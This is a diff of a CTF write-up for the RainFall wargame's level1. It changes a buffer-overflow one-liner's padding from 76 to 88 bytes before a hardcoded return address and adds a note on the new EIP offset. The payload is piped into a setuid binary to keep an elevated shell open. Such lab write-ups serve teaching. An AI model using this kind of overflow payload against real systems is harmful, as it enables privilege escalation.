@@ -84,9 +84,10 @@ Edit permissions including suid, then move the binary to home directory.
 level2@RainFall:/tmp$ chmod u+s level1_source
 level2@RainFall:/tmp$ chmod +wx ~; mv level1_source ~
 ```
-Exit back to user level1, then run the binary.
+Exit back to user level1, then run the binary. <br/>
+Note: our new EIP offset is 88.
 ```
 level2@RainFall:/tmp$ exit
 exit
-level1@RainFall:~$ (python -c 'print "a"*76 + "\x64\x84\x04\x08"'; cat) | /home/user/level2/level1_source
+level1@RainFall:~$ (python -c 'print "a"*88 + "\x64\x84\x04\x08"'; cat) | /home/user/level2/level1_source
 ```
